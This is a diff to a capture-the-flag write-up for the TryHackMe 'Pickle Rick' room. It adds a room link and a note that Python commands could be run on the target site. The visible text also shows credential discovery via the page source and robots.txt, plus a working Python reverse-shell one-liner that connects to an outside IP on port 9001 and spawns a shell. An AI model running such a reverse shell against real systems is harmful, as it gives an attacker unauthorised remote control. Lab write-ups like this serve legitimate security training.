@@ -1,6 +1,8 @@
 ## Pickle Rick
 ---
 
+Link to TryHackMe Room: https://tryhackme.com/room/picklerick
+
 ### Reconnaissance
 
 #### Nmap
@@ -59,10 +61,12 @@ This actually ended up being login.php
 
 Username found in the page source
 
-Password found in the robots.txt
+The password found in the robots.txt file
 
 
 #### Shell Script that worked on the website
+
+After some testing, and script brute-forcing, I found that python commands can be executed on the website. 
 
 ```
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.6.82.216",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
